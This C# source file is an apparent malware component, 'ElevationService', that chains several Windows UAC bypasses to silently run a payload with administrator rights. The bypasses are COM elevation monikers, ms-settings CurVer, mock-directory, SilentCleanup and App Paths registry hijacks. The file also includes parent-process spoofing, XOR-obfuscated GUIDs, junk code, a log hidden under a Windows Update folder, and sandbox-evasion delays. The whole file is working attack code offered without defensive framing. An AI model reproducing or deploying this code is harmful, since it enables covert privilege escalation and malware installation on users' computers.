using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Collections.Generic;
using Microsoft.Win32;

namespace VanguardCore
{
    public class ElevationService
    {
        // [POLY_JUNK]
        private static void _vanguard_bf418391() {
            int val = 48510;
            if (val > 50000) Console.WriteLine("Hash:" + 48510);
        }

        private static class Native
        {
            [DllImport("ole32.dll", CharSet = CharSet.Unicode, PreserveSig = true)]
            public static extern int CoGetObject(string pszName, [In] ref BIND_OPTS3 pBindOptions, [In] ref Guid riid, out IntPtr ppv);

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

            [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
            public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, ref IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
            public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool SetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, ref uint TokenInformation, uint TokenInformationLength);

            [DllImport("ole32.dll", SetLastError = true)]
            public static extern int CoInitializeEx(IntPtr pvReserved, uint dwCoInit);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool CloseHandle(IntPtr hObject);

            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
            public static extern bool CreateDirectoryW(string lpPathName, IntPtr lpSecurityAttributes);

            [DllImport("kernel32.dll", EntryPoint = "CreateSymbolicLinkW", SetLastError = true, CharSet = CharSet.Unicode)]
            public static extern bool CreateSymbolicLinkW(string lpSymlinkFileName, string lpTargetFileName, int dwFlags);

            [DllImport("user32.dll")]
            public static extern IntPtr GetForegroundWindow();

            [DllImport("user32.dll")]
            public static extern bool GetCursorPos(out POINT lpPoint);

            [StructLayout(LayoutKind.Sequential)]
            public struct POINT { public int X; public int Y; }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
            public short wShowWindow, cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess, hThread;
            public int dwProcessId, dwThreadId;
        }

        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
        private const uint TOKEN_DUPLICATE  = 0x0002;
        private const uint TOKEN_QUERY      = 0x0008;
        private const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        private const uint TOKEN_ALL_ACCESS = 0x000F01FF;
        private const int  SecurityImpersonation = 2;
        private const int  TokenPrimary = 1;
        private const uint CREATE_NO_WINDOW = 0x08000000;
        private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        private const uint PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020002;

        [StructLayout(LayoutKind.Sequential)]
        private struct BIND_OPTS3
        {
            public uint cbStruct;
            public uint dwTickCountDeadline;
            public uint dwFlags;
            public uint dwMode;
            public uint dwClassContext;
            public uint locale;
            public IntPtr pServerInfo;
            public IntPtr hwnd;
        }

        // ----- COM GUIDs -----
        private static readonly byte[] CLSID_CMSTP_ENC = { 0x36, 0x40, 0x30, 0x43, 0x46, 0x32, 0x43, 0x3c, 0x28, 0x3c, 0x32, 0x36, 0x30, 0x28, 0x31, 0x47, 0x31, 0x32, 0x28, 0x3c, 0x3d, 0x47, 0x32, 0x28, 0x3c, 0x34, 0x35, 0x41, 0x36, 0x35, 0x30, 0x34, 0x3c, 0x32, 0x31, 0x47 };
        private static readonly byte[] IID_ICMLuaUtil_ENC = { 0x33, 0x40, 0x41, 0x41, 0x33, 0x41, 0x32, 0x31, 0x28, 0x46, 0x35, 0x35, 0x32, 0x28, 0x31, 0x40, 0x32, 0x30, 0x28, 0x47, 0x32, 0x33, 0x44, 0x28, 0x40, 0x30, 0x32, 0x31, 0x35, 0x3c, 0x3c, 0x30, 0x40, 0x37, 0x31, 0x46 };
        private static readonly byte[] CLSID_ColorDataProxy_ENC = { 0x47, 0x37, 0x47, 0x40, 0x46, 0x3c, 0x37, 0x34, 0x28, 0x46, 0x32, 0x43, 0x46, 0x28, 0x31, 0x43, 0x33, 0x35, 0x28, 0x3d, 0x35, 0x34, 0x37, 0x28, 0x31, 0x47, 0x31, 0x31, 0x34, 0x47, 0x34, 0x43, 0x36, 0x31, 0x33, 0x30 };
        private static readonly byte[] IID_IColorDataProxy_ENC = { 0x35, 0x44, 0x34, 0x37, 0x44, 0x30, 0x31, 0x37, 0x28, 0x40, 0x41, 0x31, 0x37, 0x28, 0x31, 0x44, 0x33, 0x36, 0x28, 0x3d, 0x43, 0x47, 0x32, 0x28, 0x43, 0x34, 0x36, 0x30, 0x44, 0x3c, 0x46, 0x35, 0x3c, 0x41, 0x36, 0x40 };
        private static readonly byte[] CLSID_FwCplLua_ENC = { 0x40, 0x46, 0x3c, 0x3d, 0x31, 0x33, 0x47, 0x36, 0x28, 0x37, 0x32, 0x33, 0x37, 0x28, 0x31, 0x36, 0x32, 0x31, 0x28, 0x3d, 0x47, 0x36, 0x31, 0x28, 0x32, 0x37, 0x31, 0x3d, 0x33, 0x41, 0x47, 0x3c, 0x43, 0x40, 0x40, 0x31 };
        private static readonly byte[] IID_IFwCplLua_ENC = { 0x3d, 0x40, 0x47, 0x36, 0x41, 0x31, 0x43, 0x3c, 0x28, 0x36, 0x3d, 0x33, 0x31, 0x28, 0x31, 0x43, 0x35, 0x44, 0x28, 0x3c, 0x31, 0x37, 0x34, 0x28, 0x31, 0x47, 0x36, 0x41, 0x30, 0x33, 0x43, 0x3c, 0x46, 0x44, 0x35, 0x43 };

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool IsWow64Process(IntPtr hProcess, out bool lpSystemInfo);

        private static string DecryptGUID(byte[] enc)
        {
            char[] c = new char[enc.Length];
            for (int i = 0; i < enc.Length; i++) c[i] = (char)(enc[i] ^ 0x05);
            return new string(c).Trim('\0', ' ', '\t', '\n', '\r');
        }

        private static string BuildMonikerV2()
        {
            byte[] prefix = { 0x45, 0x6c, 0x65, 0x76, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x41, 0x64, 0x6d, 0x69, 0x6e, 0x69, 0x73, 0x74, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x21, 0x6e, 0x65, 0x77, 0x3a };
            string guid = DecryptGUID(CLSID_CMSTP_ENC);
            return System.Text.Encoding.ASCII.GetString(prefix) + "{" + guid + "}";
        }

        private static readonly string _logPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log");

        private static void Log(string message)
        {
            try {
                string dir = Path.GetDirectoryName(_logPath);
                if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
                File.AppendAllText(_logPath, $"{DateTime.Now}: [UAC] {message}\n"); 
            } catch { }
        }

        public static bool IsInjected()
        {
            return Environment.CommandLine.Contains("--injected");
        }

        public static bool IsAdmin()
        {
            try {
                using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                return new System.Security.Principal.WindowsPrincipal(identity).IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            } catch { return false; }
        }

        #region Bypass Methods

        private static unsafe bool BypassCmluaUtil(string payloadPath, string args, string evName)
        {
            try {
                Log("V6 Stage 5: ICMLuaUtil V2...");
                string moniker = BuildMonikerV2();
                Guid iid = new Guid(DecryptGUID(IID_ICMLuaUtil_ENC));
                BIND_OPTS3 ops = new BIND_OPTS3 { cbStruct = (uint)Marshal.SizeOf<BIND_OPTS3>(), dwClassContext = 4 };
                Native.CoInitializeEx(IntPtr.Zero, 0x2);
                int hr = Native.CoGetObject(moniker, ref ops, ref iid, out IntPtr pIface);
                if (hr != 0) return false;
                IntPtr vtbl = Marshal.ReadIntPtr(pIface);
                for (int vtblOffset = 9; vtblOffset <= 13; vtblOffset++) {
                    try {
                        var shellExec = (delegate* unmanaged[Stdcall]<IntPtr, char*, char*, char*, uint, uint, int>)Marshal.ReadIntPtr(vtbl, vtblOffset * IntPtr.Size);
                        fixed (char* pFile = payloadPath) fixed (char* pArgs = args) {
                            if (shellExec(pIface, pFile, pArgs, null, 0, 0) == 0) { Marshal.Release(pIface); return true; }
                        }
                    } catch { }
                }
                Marshal.Release(pIface); return false;
            } catch { return false; }
        }

        private static bool BypassCurVer(string payloadPath, string args, string evName, string trigger = "ComputerDefaults.exe")
        {
            string randKey = Guid.NewGuid().ToString("N").Substring(0, 8);
            string classKey = $@"Software\Classes\{randKey}";
            try {
                Log($"Method R: CurVer Hijack via {trigger} ({randKey})...");
                using (var k = Registry.CurrentUser.CreateSubKey($@"{classKey}\shell\open\command")) {
                    k.SetValue("", $"\"{payloadPath}\" {args}");
                    k.SetValue("DelegateExecute", "");
                }
                using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\CurVer")) {
                    k.SetValue("", randKey);
                }
                Process.Start(new ProcessStartInfo { FileName = trigger, UseShellExecute = true, CreateNoWindow = true });
                return WaitForAdminSuccess(10000, evName);
            } catch { return false; }
            finally {
                try { Registry.CurrentUser.DeleteSubKeyTree(classKey, false); } catch { }
                try { Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings", true)?.DeleteSubKey("CurVer", false); } catch { }
            }
        }

        private static unsafe bool BypassColorDataProxy(string payloadPath, string args, string evName)
        {
            try {
                Log("Method B: IColorDataProxy...");
                BIND_OPTS3 ops = new BIND_OPTS3 { cbStruct = (uint)Marshal.SizeOf<BIND_OPTS3>(), dwClassContext = 4 };
                string moniker = "Elevation:Administrator!new:{" + DecryptGUID(CLSID_ColorDataProxy_ENC) + "}";
                Guid iid = new Guid(DecryptGUID(IID_IColorDataProxy_ENC));
                if (Native.CoGetObject(moniker, ref ops, ref iid, out IntPtr pIface) != 0) return false;
                IntPtr vtbl = Marshal.ReadIntPtr(pIface);
                string cmd = $"cmd.exe /c start \"\" \"{payloadPath}\" {args}";
                var launchDccw = (delegate* unmanaged[Stdcall]<IntPtr, char*, int>)Marshal.ReadIntPtr(vtbl, 15 * IntPtr.Size);
                fixed (char* pCmd = cmd) {
                    if (launchDccw(pIface, pCmd) == 0) { Marshal.Release(pIface); return true; }
                }
                Marshal.Release(pIface); return false;
            } catch { return false; }
        }

        private static unsafe bool BypassFwCplLua(string payloadPath, string args)
        {
            try {
                Log("Method C: IFwCplLua...");
                BIND_OPTS3 ops = new BIND_OPTS3 { cbStruct = (uint)Marshal.SizeOf<BIND_OPTS3>(), dwClassContext = 4 };
                string moniker = "Elevation:Administrator!new:{" + DecryptGUID(CLSID_FwCplLua_ENC) + "}";
                Guid iid = new Guid(DecryptGUID(IID_IFwCplLua_ENC));
                if (Native.CoGetObject(moniker, ref ops, ref iid, out IntPtr pIface) != 0) return false;
                IntPtr vtbl = Marshal.ReadIntPtr(pIface);
                string dir = Path.GetDirectoryName(payloadPath) ?? "";
                for (int vtblOffset = 3; vtblOffset <= 6; vtblOffset++) {
                    try {
                        var shellExec = (delegate* unmanaged[Stdcall]<IntPtr, char*, char*, char*, uint, int>)Marshal.ReadIntPtr(vtbl, vtblOffset * IntPtr.Size);
                        fixed (char* pFile = payloadPath) fixed (char* pArgs = args) fixed (char* pDir = dir) {
                            if (shellExec(pIface, pFile, pArgs, pDir, 0) == 0) { Marshal.Release(pIface); return true; }
                        }
                    } catch { }
                }
                Marshal.Release(pIface); return false;
            } catch { return false; }
        }

        public static bool BypassMockDir(string payloadPath, string args, string evName)
        {
            string mockWindows = @"\\?\C:\Windows ";
            string mockSystem32 = Path.Combine(mockWindows, "System32");
            try {
                Log("Method M: Mock Directory Init...");
                if (!Native.CreateDirectoryW(mockWindows, IntPtr.Zero) && Marshal.GetLastWin32Error() != 183) return false;
                if (!Native.CreateDirectoryW(mockSystem32, IntPtr.Zero) && Marshal.GetLastWin32Error() != 183) return false;
                string triggerName = "ComputerDefaults.exe";
                string targetPath = Path.Combine(mockSystem32, triggerName);
                if (!File.Exists(targetPath)) File.Copy(Path.Combine(Environment.SystemDirectory, triggerName), targetPath);
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command")) {
                    key.SetValue("", $"\"{payloadPath}\" {args}");
                    key.SetValue("DelegateExecute", "", RegistryValueKind.String);
                }
                if (SpawnWithSpoof(targetPath, "", "taskhostw")) return WaitForAdminSuccess(10000, evName);
                return false;
            } catch { return false; }
            finally { try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false); } catch { } }
        }

        private static bool BypassSilentCleanup(string payloadPath, string args, string evName)
        {
            try {
                Log("Method H: SilentCleanup Hijack (Symlink)...");
                string fakeWindir = Path.Combine(Path.GetTempPath(), $"WinUpdate_{Guid.NewGuid():N}.tmp");
                string sys32 = Path.Combine(fakeWindir, "system32");
                Directory.CreateDirectory(sys32);
                
                // Red Team Hardcore: Use Symbolic Link instead of file copy
                if (!Native.CreateSymbolicLinkW(Path.Combine(sys32, "cleanmgr.exe"), payloadPath, 0)) {
                    // Fallback to copy if symlink fails
                    File.Copy(payloadPath, Path.Combine(sys32, "cleanmgr.exe"));
                }
                
                Registry.CurrentUser.OpenSubKey("Volatile Environment", true).SetValue("windir", fakeWindir);
                Process.Start(new ProcessStartInfo { FileName = "schtasks.exe", Arguments = "/Run /TN \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /I", CreateNoWindow = true });
                bool ok = WaitForAdminSuccess(15000, evName);
                Registry.CurrentUser.OpenSubKey("Volatile Environment", true).DeleteValue("windir", false);
                try { Directory.Delete(fakeWindir, true); } catch { }
                return ok;
            } catch { return false; }
        }

        private static bool BypassAppPaths(string payloadPath, string args, string evName, string target = "control.exe")
        {
            try {
                Log($"Method U: AppPaths Hijack ({target})...");
                string keyPath = $@"Software\Microsoft\Windows\CurrentVersion\App Paths\{target}";
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath)) {
                    key.SetValue("", payloadPath);
                    key.SetValue("Path", Path.GetDirectoryName(payloadPath));
                }
                Process.Start(new ProcessStartInfo { FileName = target, Arguments = args, UseShellExecute = true, CreateNoWindow = true });
                bool ok = WaitForAdminSuccess(12000, evName);
                try { Registry.CurrentUser.DeleteSubKeyTree(keyPath, false); } catch { }
                return ok;
            } catch { return false; }
        }

        #endregion

        public static int FindTargetAdminProcess()
        {
            int currentPid = Process.GetCurrentProcess().Id;
            int currentSession = Process.GetCurrentProcess().SessionId;
            foreach (var proc in Process.GetProcesses()) {
                try {
                    if (proc.Id == currentPid || proc.SessionId != currentSession) continue;
                    if (proc.ProcessName.ToLower().Contains("taskhostw")) return proc.Id;
                } catch { }
            }
            return -1;
        }

        public static bool SpawnWithSpoof(string payloadPath, string args, string parentProcess = "explorer")
        {
            try {
                var parents = Process.GetProcessesByName(parentProcess);
                if (parents.Length == 0) return false;
                IntPtr hParent = Native.OpenProcess(0x0480, false, parents[0].Id);
                if (hParent == IntPtr.Zero) return false;
                IntPtr lpSize = IntPtr.Zero;
                Native.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                IntPtr lpAttributeList = Marshal.AllocHGlobal(lpSize);
                Native.InitializeProcThreadAttributeList(lpAttributeList, 1, 0, ref lpSize);
                Native.UpdateProcThreadAttribute(lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ref hParent, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
                STARTUPINFOEX siex = new STARTUPINFOEX(); siex.StartupInfo.cb = Marshal.SizeOf(siex); siex.lpAttributeList = lpAttributeList;
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                bool success = Native.CreateProcess(null, $"\"{payloadPath}\" {args}", IntPtr.Zero, IntPtr.Zero, false, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siex, out pi);
                if (success) { Native.CloseHandle(pi.hProcess); Native.CloseHandle(pi.hThread); }
                Marshal.FreeHGlobal(lpAttributeList); Native.CloseHandle(hParent);
                return success;
            } catch { return false; }
        }

        private static bool WaitForAdminSuccess(int timeoutMs, string eventName)
        {
            try { using var ev = new EventWaitHandle(false, EventResetMode.ManualReset, eventName); return ev.WaitOne(timeoutMs); } catch { return false; }
        }

        public static bool RequestElevation(string payloadPath)
        {
            if (IsAdmin()) return true;
            if (!Environment.CommandLine.Contains("--spoofed")) {
                int targetPid = FindTargetAdminProcess();
                if (targetPid != -1 && SpawnWithSpoof(payloadPath, "--spoofed", "taskhostw")) return true;
            }
            DoBehavioralReputation();
            string evName = $"Global\\{Guid.NewGuid():B}";
            string args = $"--uac-child --event={evName} --rnd={Guid.NewGuid().ToString().Substring(0, 6)}";
            
            if (BypassCmluaUtil(payloadPath, args, evName)) return true;
            if (BypassFwCplLua(payloadPath, args)) return true;
            if (BypassMockDir(payloadPath, args, evName)) return true;
            if (BypassColorDataProxy(payloadPath, args, evName)) return true;
            
            // Fallback to CurVer with a safer trigger
            if (BypassCurVer(payloadPath, args, evName, "ComputerDefaults.exe")) return true;
            
            Thread.Sleep(new Random().Next(3000, 6000));
            if (BypassAppPaths(payloadPath, args, evName, "control.exe")) return true;
            if (BypassSilentCleanup(payloadPath, args, evName)) return true;
            return false;
        }

        private static void DoBehavioralReputation()
        {
            try {
                Random rnd = new Random();
                for (int i = 0; i < 5; i++) { Native.GetForegroundWindow(); Native.GetCursorPos(out _); Thread.Sleep(rnd.Next(200, 800)); }
                var env = Environment.GetEnvironmentVariables();
                Thread.Sleep(rnd.Next(1000, 3000));
            } catch { }
        }
    }
}
